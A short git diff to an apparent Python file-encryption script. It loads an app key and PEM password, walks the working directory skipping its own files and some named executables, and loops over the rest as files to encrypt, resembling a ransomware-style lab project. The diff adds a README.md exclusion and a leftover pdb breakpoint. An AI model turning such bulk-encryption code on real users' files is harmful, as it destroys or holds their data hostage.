@@ -1,10 +1,12 @@
 import os
 import Decryption as dec
 import keys
+import pdb
 
 if __name__ == '__main__':
     #Retrieves the path to the current location of this file
     curr_path = os.getcwd()
+    pdb.set_trace()
     #Retrieve the application key
     appKey = keys.getAppKey('./appKey.txt')
     #Ask the user for an input and attempt to retrieve the password for the PEM file
@@ -24,7 +26,8 @@ if __name__ == '__main__':
             remove_list = list(files)
             for i in remove_list:
                 if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'
-                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe' or i == 'appKey.txt'):
+                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe' or i == 'appKey.txt' or 
+                    i == 'README.md'):
                     files.remove(i)
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
